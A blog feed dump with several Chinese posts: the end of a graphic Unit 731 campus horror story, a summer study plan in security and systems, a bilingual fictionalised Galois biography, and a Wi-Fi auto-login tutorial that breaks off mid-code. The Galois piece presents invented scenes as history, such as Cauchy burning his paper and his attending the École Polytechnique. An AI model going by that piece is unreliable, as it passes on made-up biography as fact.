title="第三章：不存在的231室"></a>第三章：不存在的231室</h2><p>值班室里灯光惨白。宿管阿姨佝偻着背，正用一把生锈的指甲钳，慢条斯理地剪着脚趾甲。灰黄坚硬的碎甲片不时“啪嗒”溅落在摊开的、沾满污渍的《学生守则》封面上。听到我们提出换宿申请，并说出“231室”几个字时，她剪指甲的动作骤然停止。头颅极其缓慢地抬起，那张蜡黄松弛的脸在灯光下显得格外诡异。接着，她的嘴角以一种完全违背人体结构的方式，猛地向两侧耳根撕裂开来，露出里面黑洞洞的口腔和几颗焦黄的烂牙，一个混合着痰音和金属摩擦的声音挤出喉咙：“231……嘿嘿……好地方啊……朝南，冬暖夏凉…可舒服了……”那笑容里的恶意几乎要溢出来。</p><p>推开231室房门的瞬间，一股浓烈到令人作呕的霉味混合着福尔马林和某种难以言喻的腐败甜腥气，如同腐烂的淤泥般扑面而来，几乎凝成实质，黏在皮肤和呼吸道黏膜上。墙纸大片大片地剥落、卷曲，像垂死的皮肤。剥落的墙皮下，赫然是用暗红色的、仿佛凝固血液写下的巨大日文——“死んでくれ”（去死吧）。字迹扭曲狰狞，透出刻骨的怨毒。就在我们被这景象震慑的刹那，几只焦黑如炭、皮肉粘连着骨头、指关节扭曲变形的手，闪电般从床底阴影中伸出！冰冷、枯槁的手指如同铁钳，死死扣住我们的脚踝！那触感坚硬、冰冷，带着一种深入骨髓的阴寒，瞬间夺走了腿部的力气。阿杰发出不似人声的凄厉尖叫：“镜子！看镜子！！”</p><p>我们惊恐地扭头看向门后那面布满污垢的落地镜——镜中的倒影里，我们身后，无声无息地矗立着七个穿着惨白、沾满暗褐色污渍白大褂的人影！他们的脸上戴着厚厚的口罩，那惨白的棉布口罩中央，清晰地印着一个血红色的圆形标志，里面是狰狞的“731”数字！最中间的那个身影，缓缓举起一把闪着寒光的手术刀。一滴粘稠、黄绿色的液体从刀尖渗出，滴落在镜中倒影的地板上，瞬间腾起一缕带着强烈刺激性气味的、诡异的青烟。</p><h2 id="第四章：血色广播"><a href="#第四章：血色广播" class="headerlink" title="第四章：血色广播"></a>第四章：血色广播</h2><p>死寂被骤然打破！房间角落里，一台早已废弃、布满灰尘的老式收音机，竟自行亮起了幽绿的光，随即，那首饱含血泪的《松花江上》的旋律，如同呜咽的鬼魂，断断续续、充满杂音地流淌出来，瞬间填满了整个231室！旋律响起的刹那，整个房间开始剧烈地震颤！墙壁如同活物般起伏，天花板的缝隙里，不再是灰尘，而是大量粘稠、暗红如静脉血的液体，如同瀑布般汩汩涌下，顷刻间在地面汇聚成一片粘稠的血泊！墙壁上，无数张痛苦扭曲、无声呐喊的人脸如同浮雕般争先恐后地浮现、挤压，密密麻麻，填满了每一寸空间！他们空洞的眼窝淌着血泪，大张的嘴巴里只有黑暗，无声的绝望和怨毒几乎将空气点燃！</p><p>收音机的杂音陡然拔高，变成一种刺耳的电流尖啸，宿管阿姨那被扭曲、拉长的声音穿透而出，带着金属摩擦般的尖锐，每一个音节都像冰冷的针扎进耳膜：“实验体37号…时间到了…该…注射了……”</p><p>求生的本能压倒一切！我和阿杰用尽全身力气撞向那扇紧闭的窗户！玻璃碎裂！然而，窗外的景象让我们魂飞魄散——6楼之下，原本熟悉的水泥地面消失不见，取而代之的是一片疯狂向上“生长”的、密密麻麻、层层叠叠的森森白骨！那景象如同地狱的丛林，瞬间淹没了视线！</p><p>“啊啊啊——！！！”身边的阿杰突然爆发出非人的惨嚎！他疯狂地撕扯着自己的上衣，纽扣崩飞。裸露出的后背上，皮肤剧烈地起伏、蠕动！一个清晰的、青黑色的刺青图案，如同烙印般从皮肉下浮现出来——正是731部队那枚恶魔般的标志！阿杰的眼神彻底涣散，充满了无法理解的恐惧和一种诡异的狂热。他猛地抓起一块锋利的碎玻璃，毫不犹豫地、狠狠地划向自己的喉咙！</p><p>鲜血如同喷泉般激射而出！滚烫的血浆“噗”地一声，溅满了那面映照着白大褂人影的落地镜！血污流淌的瞬间，镜面仿佛变成了一个深不见底的窗口——镜中映出的不再是房间，而是一个巨大、冰冷、充满铁锈和消毒水气味的巨大地下空间！一排排冰冷的铁床上，用皮带紧紧捆绑着数百具赤裸、扭曲的尸体！他们的胸腔被残忍地剖开，如同被解剖的标本，空洞的腹腔里，塞满了发霉、枯黄的稻草！强烈的视觉冲击和令人窒息的恶臭感，透过镜面直冲脑海！</p><h2 id="第五章：紫烟与真相"><a href="#第五章：紫烟与真相" class="headerlink" title="第五章：紫烟与真相"></a>第五章：紫烟与真相</h2><p>就在我们濒临崩溃的边缘，一道昏黄摇曳的光线刺破了231室的浓重黑暗。班主任王老师举着一盏老旧的煤油灯，如同幽灵般悄无声息地出现在门口。昏黄的灯光在她脸上投下跳动的、深重的阴影，让她的表情显得格外莫测。她径直走到房间中央，无视周围地狱般的景象，目光落在林羽曾经躺过的位置，带着一种难以言喻的悲怆。</p><p>“林羽…”她开口，声音低沉沙哑，仿佛也承受着巨大的痛苦，“他发现了…这里，埋着731部队来不及销毁的…活体实验记录档案…真正的核心档案。那些被折磨、被遗忘的亡魂…他们的痛苦和怨恨太深了…深到连地狱都无法容纳。他们被困在这里…唯一能穿透绝望、连接他们破碎记忆的…只有那首来自故乡的歌谣…刻在骨髓里的旋律…”她说着，手指颤抖着解开了自己衬衫领口的几颗纽扣。</p><p>煤油灯的光照亮了她锁骨下方——一道巨大、狰狞的缝合疤痕横贯整个胸膛！疤痕歪歪扭扭，像一条巨大的蜈蚣，针脚的痕迹清晰可见，边缘的皮肤呈现出不自然的紫红色，仿佛皮下的东西仍在挣扎。那景象触目惊心，诉说着非人的痛苦。</p><p>随着收音机里《松花江上》的旋律逐渐走向悲怆的高潮，房间墙壁上那些用血写下的日文诅咒，如同被点燃的符纸，猛地燃烧起来！火焰并非寻常的橙红，而是幽幽的、冰冷的、令人毛骨悚然的紫色！紫焰无声地舔舐着墙壁，没有热量，只有刺骨的寒意和一种灵魂被灼烧的尖啸感在脑海中回响！</p><p>“走！”王老师厉喝一声。我们连滚爬爬地冲向门口。冲出宿舍楼的刹那，脚下的大地如同巨兽翻身般剧烈震动！整个校园都在摇晃！从地底深处，传来沉重、巨大的金属锁链被疯狂拖拽、摩擦的刺耳声响！仿佛有什么庞然大物正从地狱的囚笼中挣脱！</p><p>“呃…啊啊…”身旁的阿杰突然发出痛苦的呻吟。他佝偻着身体，后背剧烈地抽搐。他身上的衣服被撑破，皮肤下仿佛有无数活物在蠕动！一片片灰黑色、如同蛇鳞般的物质，正伴随着令人牙酸的“嗤啦”声，从他后背的皮肉中硬生生顶出、剥落！鲜血浸透了破碎的衣物。他猛地回过头，那双曾经熟悉的眼睛，瞳孔已经变成了冰冷的、属于爬行动物的竖瞳！他的声音变得嘶哑、非人，带着一种诡异的回响：“他们…选了我…当新的容器…走不掉了……”</p><h2 id="尾声：未完的轮回"><a href="#尾声：未完的轮回" class="headerlink" title="　尾声：未完的轮回"></a>　尾声：未完的轮回</h2><p>三个月后，初春的风还带着寒意。我在图书馆尘封的旧书区最深处，偶然发现了一本封面残破、纸张发黄脆硬的日记本。出版日期赫然印着“昭和十七年”（1942年）。怀着一种难以言喻的悸动，我翻开了它。日记里充斥着冰冷、机械的实验记录术语和施虐者扭曲的快意。最后一页，没有文字，只夹着半片颜色灰白、边缘参差不齐的人类指甲。指甲上，用极细的笔尖，刻着一行微小的日文：</p><blockquote><p>“<strong>实验体 38号，存活。観察継続。</strong>”（实验体38号，存活。继续观察。）</p></blockquote><p>一股寒意瞬间从脚底窜上头顶。就在这时，窗外，图书馆侧面的樱花树下，一阵整齐、沉重、带着金属回音的军靴踏步声，由远及近，清晰地传来。我猛地转头望去——七道穿着染血白大褂的模糊身影，如同雾气凝结，正静静地、无声地站在初绽的樱花树下。惨白的口罩上，那个代表731部队的猩红圆形标志，在春日惨淡的阳光下，红得刺眼，红得滴血。冰冷的竖瞳目光，穿透玻璃窗，牢牢地锁定了我。</p>]]></content>
      
      
      <categories>
          
          <category> 琐记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Daily Life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025暑假计划</title>
      <link href="/posts/941719aa.html"/>
      <url>/posts/941719aa.html</url>
      
        <content type="html"><![CDATA[<p>暑假已经拉开帷幕，这是一段绝佳的自我提升时光！今年暑假，我的目标是深入钻研计算机科学的核心领域，掌握关键知识体系，并通过实践项目巩固所学，最终实现从理论到应用的跨越。</p><h3 id="学习计划"><a href="#学习计划" class="headerlink" title="学习计划"></a>学习计划</h3><h4 id="1-理论知识攻坚（大黑本）"><a href="#1-理论知识攻坚（大黑本）" class="headerlink" title="1. 理论知识攻坚（大黑本）"></a>1. <strong>理论知识攻坚（大黑本）</strong></h4><ul><li><strong>计算机组成原理</strong>：深入理解计算机硬件的各个组成部分（如中央处理器、存储器、输入输出系统等）以及它们之间的协同工作原理。通过对指令集架构、数据通路、流水线技术等核心概念的学习，掌握计算机系统运行的底层逻辑。</li><li><strong>计算机网络</strong>：探索计算机网络的层级结构，从物理层的信号传输到应用层的协议实现。重点理解TCP/IP协议栈、网络拓扑结构、路由算法以及网络安全机制等关键知识点，为后续的网络应用开发奠定坚实基础。</li><li><strong>深入理解计算机系统</strong>：这本书从程序员视角出发，全面剖析计算机系统的运行机制。通过学习内存管理、文件系统、进程调度等内容，深入理解操作系统如何管理硬件资源，以及程序在计算机系统中的运行过程。</li></ul><h4 id="2-网络安全专项"><a href="#2-网络安全专项" class="headerlink" title="2. 网络安全专项"></a>2. <strong>网络安全专项</strong></h4><ul><li><strong>web安全</strong>：熟悉常见的Web安全漏洞，如SQL注入、XSS漏洞、CSRF漏洞等，并利用这些漏洞进行安全测试。</li><li><strong>逆向工程</strong>：了解常见的逆向工具（如ida、ghidra等），并利用这些工具对软件进行静态分析、动态调试，了解软件运行机制。</li><li><strong>pwn</strong>：了解常见的漏洞利用技术，如buffer overflow、format string漏洞、远程代码执行漏洞等，并利用这些漏洞进行安全测试。</li></ul><h4 id="3-知识拓展与巩固"><a href="#3-知识拓展与巩固" class="headerlink" title="3. 知识拓展与巩固"></a>3. <strong>知识拓展与巩固</strong></h4><ul><li><strong>系统和软件设计框架</strong>：学习常见的设计模式（如单例模式、工厂模式、观察者模式等）以及软件架构风格（如分层架构、微服务架构等），掌握如何设计高可扩展性、高可维护性的系统。同时，了解系统设计的关键要素，如性能优化、容错机制、负载均衡等。</li><li><strong>编程语言复习与提升</strong>：回顾自己学过的编程语言（如C、C++、Python、Java等），深入理解每种语言的语法特性、内存管理机制以及适用场景。通过对比不同语言的优缺点，加深对编程范式的理解，提升编程能力。</li></ul><h3 id="实践项目"><a href="#实践项目" class="headerlink" title="实践项目"></a>实践项目</h3><h4 id="1-CTF综合功能工具软件设计"><a href="#1-CTF综合功能工具软件设计" class="headerlink" title="1. CTF综合功能工具软件设计"></a>1. <strong>CTF综合功能工具软件设计</strong></h4><p>CTF（Capture The Flag）竞赛是网络安全领域的经典赛事，涉及加密解密、漏洞挖掘、逆向工程等多个方向。设计一个CTF综合功能工具软件，可以帮助参赛者快速定位问题、自动化解决常见挑战，提升竞赛效率。该工具软件将具备以下功能模块：</p><ul><li><strong>加密解密模块</strong>：支持常见的加密算法（如AES、RSA、DES等）的加解密操作，提供密码学工具，帮助分析加密数据。</li><li><strong>漏洞扫描与利用模块</strong>：集成常见的漏洞扫描工具（如Nmap、OpenVAS等），并提供漏洞利用脚本库，方便快速验证和利用漏洞。</li><li><strong>逆向工程模块</strong>：支持对二进制文件的反汇编、反编译操作，提供调试工具（如GDB、IDA Pro等）的接口，方便分析恶意软件或破解软件保护机制。</li><li><strong>数据包分析模块</strong>：集成Wireshark等工具，实现网络数据包的捕获、解析和分析，帮助解决网络相关的CTF挑战。</li></ul><h4 id="2-操作系统设计（挑战性项目）"><a href="#2-操作系统设计（挑战性项目）" class="headerlink" title="2. 操作系统设计（挑战性项目）"></a>2. <strong>操作系统设计（挑战性项目）</strong></h4><p>如果时间允许，我将尝试设计一个简单的操作系统内核。虽然这是一个极具挑战性的项目，但通过实践可以深入理解操作系统的底层实现机制。初步计划包括：</p><ul><li><strong>内核架构设计</strong>：确定操作系统的架构风格（如单内核、微内核等），设计内核的模块化结构，包括进程管理、内存管理、文件系统、设备驱动等核心模块。</li><li><strong>进程管理</strong>：实现进程的创建、调度和销毁机制，支持多进程并发运行。设计进程调度算法（如时间片轮转、优先级调度等），确保系统的高效运行。</li><li><strong>内存管理</strong>：实现内存分配和回收机制，支持虚拟内存管理，通过分页或分段机制提高内存利用率。</li><li><strong>文件系统设计</strong>：设计一个简单的文件系统，支持文件的创建、读写、删除等操作。实现文件系统的目录结构和索引机制，确保数据的持久化存储。</li><li><strong>设备驱动开发</strong>：编写简单的设备驱动程序，实现对输入输出设备（如键盘、鼠标、显示器等）的控制和管理。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 琐记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Daily Life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>伽罗瓦传(The Galois Chronicles)</title>
      <link href="/posts/b3d7f8a5.html"/>
      <url>/posts/b3d7f8a5.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>数学界不朽的传奇，英年早逝的天才少年！！！伽罗瓦的名字对数学专业的学生来说并不陌生。他对数学界产生了很深远的影响，现代科学很多理论都离不开他提出的群论。他的天才和智慧将永远铭刻在数学史的长河中。</p></blockquote><h1 id="墨水与星辰：伽罗瓦传"><a href="#墨水与星辰：伽罗瓦传" class="headerlink" title="墨水与星辰：伽罗瓦传"></a>墨水与星辰：伽罗瓦传</h1><h2 id="序章：晨雾中的低语"><a href="#序章：晨雾中的低语" class="headerlink" title="序章：晨雾中的低语"></a>序章：晨雾中的低语</h2><p>塞纳河畔的雾气正织就暮春的幕布，二十一岁的伽罗瓦蹲在石板路上，怀中被雨水洇透的纸页仿若浸血的月光。他用指尖摩挲着那些尚未干涸的墨迹——那是他用生命淬炼的群论公式，试图破解五次方程的最后谜面。</p><p>“埃瓦里斯特！”远处教堂的钟声惊起一滩白鹭。伽罗瓦的瞳孔在晨光中骤缩为针尖，四年前路易 - 勒格拉学校的旧影正从雾中浮现：少年在煤油灯下狂草代数的刹那，数学老师曾用颤抖的指尖触碰他的纸张，惊呼中带着不祥的预感。</p><p>雨丝突然变得滚烫起来。伽罗瓦看见柯西的白发在科学院的大厅飘动，那双浑浊的眼睛正将他未完成的论文揉成纸团；狱中的铁窗正泛起血色锈痕，面包屑在潮湿中生出霉斑，他用这些肮脏的颗粒推演置换群的轨迹；而那个曾与他在图书馆偷情的女学监女儿，此刻正从雾中走来，手中攥着染血的百合花。</p><p>决斗的号角穿透云层。伽罗瓦将沾满泥渍的手稿折成纸船，任其随塞纳河漂流至断头台旧址。当第一缕晨光撕裂巴黎的穹顶，少年的体温正在胸膛的弹孔处冷却，而他留在手稿封底的预言正被雨水晕染成谶语：“群的舞步将跨越永恒，而第五个根永远无法用尺规丈量。”</p><h2 id="第一章：天才的诞生"><a href="#第一章：天才的诞生" class="headerlink" title="第一章：天才的诞生"></a>第一章：天才的诞生</h2><p><strong>埃皮纳勒小镇的晨雾尚未散尽</strong>，伽罗瓦的羽毛笔已在羊皮纸上划出尖锐的轨迹。十四岁的他站在高高的脚凳上，踮起脚尖够着父亲书房最高书架上的《几何原本》。窗外的栗子花簌簌落了他一头，少年却浑然不觉，指尖已将欧几里得的命题揉成流沙。那座古老的修道院钟楼在晨光中泛着铅灰色，正与他瞳孔里旋转的方程组相互映照。</p><p>第一次踏入巴黎综合理工学院的礼堂时，少年的马裤上还沾着晨跑溅起的泥点。他攥着皱巴巴的录取通知书，像手持圣徒遗物般庄重。讲台上，柯西的白发在烛光里飘动，三角板碰撞出清脆的声响：“五次方程的根式解将彻底颠覆数学的根基。”伽罗瓦的笔尖顿住，墨水在草稿纸上洇出一朵黑色的罂粟花。</p><h2 id="第二章：群论的诞生"><a href="#第二章：群论的诞生" class="headerlink" title="第二章：群论的诞生"></a>第二章：群论的诞生</h2><p>午夜的图书馆里，微弱的烛光在羊皮纸上投下少年的侧影。伽罗瓦的羽毛笔如饥饿的蝗虫啃噬着纸页，那些在柯西论文里被视为“荒诞”的置换群，正从他笔下流淌出灵性的韵律。墨水瓶逐渐干涸，他沾着自己的血迹续写公式，直到掌心凝结出暗红的晶钻。</p><p>“数学的真谛不在数字，而在它们的舞蹈。”他对着窗棂上的蜘蛛低语，却惊动了藏书室深处的女学监。玛德琳娜的裙裾扫过书架时带起灰尘，她将一朵干枯的鸢尾花别进少年的领口，指尖触到他滚烫的额头：“你的头脑比巴黎七月的空气更炽热。”</p><p>当伽罗瓦将沾满血渍的论文交给法兰西科学院时，泊松的白手套几乎被染红。柯西在廊柱后暗笑，他将那叠泛黄的纸页塞进壁炉：“孩子的狂想曲，比不上拉格朗日的奏鸣曲。”火焰吞噬墨迹的瞬间，少年的瞳孔里闪过断头台的寒光。</p><h2 id="第三章：革命与监狱"><a href="#第三章：革命与监狱" class="headerlink" title="第三章：革命与监狱"></a>第三章：革命与监狱</h2><p>七月革命的硝烟尚未散尽，伽罗瓦已将三色旗裹在肩头。他在街垒间挥舞着父亲留下的佩剑，刀刃与火药气交织成致命的华尔兹。当反叛军的尸体被塞纳河吞没，他将缴获的军用手枪对准自己太阳穴——却被玛德琳娜的纤指挡住：“为数学而死，比为自由而死更值得。”</p><p>监狱的铁窗在月光下泛起青色锈痕。伽罗瓦用生锈的汤匙在石墙上刻下置换群的公式，面包屑在潮湿中生出霉斑，他用这些肮脏的颗粒推演群的结构。某夜，他听见玛德琳娜在走廊尽头哼唱《马赛曲》，旋律里混着铁链拖动的节奏。</p><h2 id="第四章：宿命的决斗"><a href="#第四章：宿命的决斗" class="headerlink" title="第四章：宿命的决斗"></a>第四章：宿命的决斗</h2><p>四月的巴黎开满血腥味的丁香花。伽罗瓦在阁楼里写最后一封信，墨水与血迹在信纸上纠缠成凄美的图案。他将手稿折成纸飞机，任其掠过断头台旧址，坠入塞纳河的淤泥。玛德琳娜的裙裾在街角飘动，她将一朵染血的百合别进他的纽扣孔：“记住，数学比爱情更永恒。”</p><p>决斗场的晨雾尚未散尽，阳光透过树梢在青石板上绣出金色花纹。伽罗瓦的影子被拉得很长，像一支横卧的几何尺。当子弹穿透胸膛的瞬间，他看见方程的解在眼前化作漫天繁星，而玛德琳娜的裙摆在晨风中飘成血色晚霞。</p><h2 id="尾声：永恒的群论"><a href="#尾声：永恒的群论" class="headerlink" title="尾声：永恒的群论"></a>尾声：永恒的群论</h2><p>巴黎医学院的太平间弥漫着松木与死亡的气息。伽罗瓦的遗体被草草裹在白布中，唯一能证明他身份的，是胸前那张沾满血渍的方程式草稿。他的兄弟取走手稿时，发现背面写着：“我的思想将比星辰更永恒。”</p><p>多年后，那些被遗弃的手稿在阁楼积灰中重见天日。数学家们惊愕地发现，伽罗瓦用生命铸就的群论，竟成为现代数学的基石。当他的公式被刻在卢森堡公园的大理石上时，晚霞正将塞纳河染成血色 —— 仿佛二十一岁的少年从未离去，只是化作方程式里永恒的变量，继续在数字的宇宙中舞蹈。</p><hr><h1 id="Ink-and-Stars-The-Galois-Chronicles"><a href="#Ink-and-Stars-The-Galois-Chronicles" class="headerlink" title="Ink and Stars: The Galois Chronicles"></a>Ink and Stars: The Galois Chronicles</h1><h2 id="Prologue-Whispers-in-the-Dawn-Mist"><a href="#Prologue-Whispers-in-the-Dawn-Mist" class="headerlink" title="Prologue: Whispers in the Dawn Mist"></a>Prologue: Whispers in the Dawn Mist</h2><p>The mist along the Seine wove a curtain over late spring. Twenty-one-year-old Galois squatted on the cobblestones, his rain-stained papers glowing like moon-kissed blood. His fingers traced the still-wet ink — equations of group theory, his life’s essence poured out to crack the quintic equation’s final riddle.</p><p>“Évariste!” A church bell’s chime startled a flock of egrets into flight. Galois’s pupils shrank to pinpricks as memories surfaced through the mist: four years prior, in his youth at the Lycée Louis-le-Grand, his math teacher had trembled as he touched the young man’s paper, his cry carrying an ominous foreboding.</p><p>The rain turned scalding. Galois envisioned Cauchy’s white hair floating in the Academy’s hall, those turbid eyes crumpling his unfinished paper; prison windows rusted blood-red, bread crumbs molding as he traced permutation groups with them; and the schoolmistress’s daughter who’d dallied with him in the library, now approaching from the mist with blood-stained lilies.</p><p>As the duel’s horn pierced the clouds, Galois folded his mud-spattered manuscript into a paper boat. It drifted down the Seine past the old guillotine site. With the first dawn light splitting Paris’s dome, the youth’s warmth cooled in the bullet hole in his chest, his final prophecy on the manuscript’s back blurring in the rain: “The group’s dance will outlast eternity, and the fifth root can never be measured with a ruler and compass.”</p><h2 id="Chapter-1-The-Birth-of-a-Prodigy"><a href="#Chapter-1-The-Birth-of-a-Prodigy" class="headerlink" title="Chapter 1: The Birth of a Prodigy"></a>Chapter 1: The Birth of a Prodigy</h2><p>The morning mist of Épinal had not yet lifted when Galois’s quill was already etching sharp lines on parchment. At fourteen, he stood on a tall stool, toes barely touching, reaching for Euclid’s Elements on the highest shelf of his father’s study. Chestnut blossoms fell on his head, but the young man was oblivious, his fingers already turning Euclid’s propositions into sand. The ancient convent bell tower glowed lead-grey in the dawn light, mirroring the equations spinning in his pupils.</p><p>When he first stepped into the amphitheater of the École Polytechnique, mud splattered on his breeches from his morning run. He clutched his crumpled acceptance letter like a holy relic. On the podium, Cauchy’s white hair floated in the candlelight, the triangle ruler clinking crisply: “The quintic equation’s radical solution will upend the foundations of mathematics.” Galois’s pen froze, ink blooming into a black poppy on the scratch paper.</p><h2 id="Chapter-2-The-Birth-of-Group-Theory"><a href="#Chapter-2-The-Birth-of-Group-Theory" class="headerlink" title="Chapter 2: The Birth of Group Theory"></a>Chapter 2: The Birth of Group Theory</h2><p>In the midnight library, the faint candlelight cast the youth’s silhouette on parchment. Galois’s quill devoured the paper like a ravenous locust. The permutation groups deemed “absurd” in Cauchy’s papers now flowed with spiritual rhythm from his pen. As the inkwell emptied, he continued writing with his own blood, until dark red crystals formed on his palms.</p><p>“Mathematics’ essence lies not in numbers, but in their dance,” he whispered to a spider on the window lattice, unaware of the headmistress approaching from the library’s depths. Mademoiselle’s skirt swept up dust as she tucked a withered iris into the young man’s collar, her fingertips touching his feverish forehead: “Your mind burns hotter than Paris’s July air.”</p><p>When Galois handed his blood-stained paper to the French Academy of Sciences, Poisson’s white gloves nearly turned red. Cauchy snickered behind a column, shoving the yellowed pages into the fireplace: “A child’s fantasy, no match for Lagrange’s symphony.” As flames consumed the ink, the youth’s pupils flashed with the guillotine’s寒光.</p><h2 id="Chapter-3-Revolution-and-Prison"><a href="#Chapter-3-Revolution-and-Prison" class="headerlink" title="Chapter 3: Revolution and Prison"></a>Chapter 3: Revolution and Prison</h2><p>The July Revolution’s smoke had not yet cleared when Galois draped the tricolor over his shoulders. He swung his father’s sword in the street barricades, the blade and gunpowder weaving a fatal waltz. As rebels’ bodies were swallowed by the Seine, he pressed his father’s military pistol to his temple — only to have Mademoiselle’s纤指 block it: “Dying for mathematics is worthier than dying for freedom.”</p><p>Prison windows gleamed with blue rust under the moon. Galois carved permutation group formulas on the stone walls with a rusty spoon, molding moldy面包屑 into group structures. One night, he heard Mademoiselle humming “La Marseillaise” at the corridor’s end, the melody mingling with the rhythm of dragging iron chains.</p><h2 id="Chapter-4-The-Fated-Duel"><a href="#Chapter-4-The-Fated-Duel" class="headerlink" title="Chapter 4: The Fated Duel"></a>Chapter 4: The Fated Duel</h2><p>In April, Paris was awash with丁香花 carrying a bloody scent. Galois wrote his final letter in the attic, ink and blood intertwining into a poignant pattern on the paper. He folded the manuscript into a paper airplane, letting it soar past the old guillotine site and plummet into the Seine’s silt. Mademoiselle’s skirt fluttered at the street corner as she pinned a blood-stained lily to his buttonhole: “Remember, mathematics outlasts love.”</p><p>The dawn mist had not yet lifted at the duel ground. Sunlight filtered through the trees, embroidering golden patterns on the cobblestones. Galois’s shadow stretched long, like a prostrate geometric ruler. As the bullet pierced his chest, he saw the equation’s solution burst into a sky of stars, while Mademoiselle’s skirt fluttered into a blood-red evening glow in the morning breeze.</p><h2 id="Epilogue-The-Eternal-Group-Theory"><a href="#Epilogue-The-Eternal-Group-Theory" class="headerlink" title="Epilogue: The Eternal Group Theory"></a>Epilogue: The Eternal Group Theory</h2><p>The Paris Medical School’s morgue reeked of pine and death. Galois’s body was hastily wrapped in a shroud, his identity proven only by the blood-stained equation manuscript on his chest. When his brother took the manuscript, he found on the back: “My thoughts will outlast the stars.”</p><p>Years later, those abandoned manuscripts resurfaced from attic dust. Mathematicians were shocked to find Galois’s group theory, forged in his life’s final moments, had become modern mathematics’ bedrock. As his formulas were carved into Luxembourg Garden’s marble, the evening glow dyed the Seine blood-red — as if the twenty-one-year-old youth had never left, but transformed into an eternal variable in the equation, continuing to dance in the universe of numbers.</p>]]></content>
      
      
      <categories>
          
          <category> 琐记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Daily Life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自动连接校园网wifi脚本（自动网页认证）</title>
      <link href="/posts/32f07ba6.html"/>
      <url>/posts/32f07ba6.html</url>
      
        <content type="html"><![CDATA[<h1 id="自动连接校园网wifi脚本实践（自动网页认证）"><a href="#自动连接校园网wifi脚本实践（自动网页认证）" class="headerlink" title="自动连接校园网wifi脚本实践（自动网页认证）"></a>自动连接校园网wifi脚本实践（自动网页认证）</h1><blockquote><p>抽了一下空将自己编写的一个自动化校园网连接脚本的编写思路整理了一下。该脚本只测试过fosu的校园网，但其他校园网的连接方式应该也类似。</p></blockquote><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>经常从实验室、教室和宿舍来回穿梭，每次都要手动连接校园网，非常麻烦。因此，我决定编写一个脚本，自动连接校园网。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>首先要对校园网的连接方式进行分析，fosu的校园网是通过网页认证的方式连接的，因此，我选择了使用python的requests库来模拟网页认证。</p><h3 id="分析校园网登录逻辑"><a href="#分析校园网登录逻辑" class="headerlink" title="分析校园网登录逻辑"></a>分析校园网登录逻辑</h3><blockquote><p>该过程中需要使用到浏览器的开发者工具，博主使用的是edge浏览器，因此使用了edge的F12功能（快捷键Ctrl+Shift+I）来进行分析。但博主先前给开发者工具设置了中文，因此在下面的图片中出现的文字都是中文，会在博文中用（）来标注对应的英文。</p></blockquote><p>登录校园网认证网页，先点击F12，选中网络（Network），并勾选保存日志（Preserve log）。</p><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/32f07ba6_1.png" alt="示例图片" style="zoom:50%;" /></p><p>再在网页输入账户密码，点击login，看看发了哪些请求（一般network的前几个比较重要，后面的都是资源文件）</p><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/32f07ba6_2.png" alt="示例图片" style="zoom:50%;" /></p><p>这里发现发了两个请求，第一个post请求，第二个get请求（每个学校的不一样，fosu的可以直接用本教程方法）<br>第一个请求post，标头（Headers）中有：</p><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/32f07ba6_3.png" alt="示例图片" style="zoom:50%;" /></p><p>查看一下负载（Payload），查看post请求携带的数据，发现里面包含了自己的校园网账户和密码</p><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/32f07ba6_4.png" alt="示例图片" style="zoom:50%;" /></p><p>第二个请求get：</p><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/32f07ba6_5.png" alt="示例图片" style="zoom:50%;" /></p><p>复制上面的request URL到浏览器，发现就是可以访问的认证界面。</p><blockquote><p>总结：点击login按钮后，我的密码是先通过一个post请求提交到服务器，然后再通过一个get请求去实现登录的。</p></blockquote><p>那脚本要做的事情就是：当发现当前处于未登录状态时，要模拟浏览器的行为，先发一个post请求，请求header和data都要和浏览器上的内容对应，然后再发一个get请求就可以了。（有点像爬虫做的事情）</p><h3 id="判断当前是否处于未登录状态"><a href="#判断当前是否处于未登录状态" class="headerlink" title="判断当前是否处于未登录状态"></a>判断当前是否处于未登录状态</h3><p>一般提交get请求时，当前已经登录和为登录状态得到html文档中的标签内容是不一样的。这里我们在已登录状态下，按F12，再按ctrl+F查找下的内容，发现果然有标识。</p><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/32f07ba6_6.png" alt="示例图片" style="zoom:50%;" /></p><p>也就是说，当get请求结果返回的title标签内容是“登录成功”时，当前就已经处于登录状态了，此时不需要再进行认证，如果不是tittle标签内容不是“登录成功”，则说明当前未登录，需要发请求进行认证。</p><h2 id="代码设计"><a href="#代码设计" class="headerlink" title="代码设计"></a>代码设计</h2><p>首先梳理一下脚本的大致功能逻辑，然后后面再对代码进行功能扩充、优化修改。</p><h3 id="粗设计"><a href="#粗设计" class="headerlink" title="粗设计"></a>粗设计</h3><ul><li><ol><li>写一个死循环，不断判断当前是否处于登录状态：直接发get请求，如果返回的tittle为“登录成功”，则为已登录状态。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;自动联网脚本开始运行...&quot;</span>)</span><br><span class="line">    <span 